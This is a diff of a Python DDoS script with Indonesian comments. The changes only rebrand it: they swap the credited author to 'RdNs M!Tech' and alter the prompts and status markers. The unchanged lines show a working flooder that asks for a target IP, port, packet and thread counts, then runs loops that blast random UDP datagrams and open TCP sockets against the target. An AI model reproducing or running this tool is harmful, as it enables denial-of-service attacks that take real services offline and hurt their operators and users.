@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #Jangan ganti Nama Nya ini Buat M!Tech Anjing
-#Ddos by Yooooo
+#Ddos by RdNs M!Tech
 import random
 import socket
 import threading
@@ -11,12 +11,12 @@ print("DDoS Tools ByRdNs M!Tech")
 print("Pasti Tembus Nih Kalau M!Tech Yang Ddos")
 ip = str(input(" Ip: "))
 port = int(input(" Port: "))
-choice = str(input(" Gas?(y/n): "))
+choice = str(input(" UDAH SIAP BELUM?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
   data = random._urandom(1024)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[M!]","[M!]","[M!]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -29,7 +29,7 @@ def run():
 
 def run2():
   data = random._urandom(16)
-  i = random.choice(("[*]","[!]","[#]"))
+  i = random.choice(("[M!]","[M!]","[M!]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
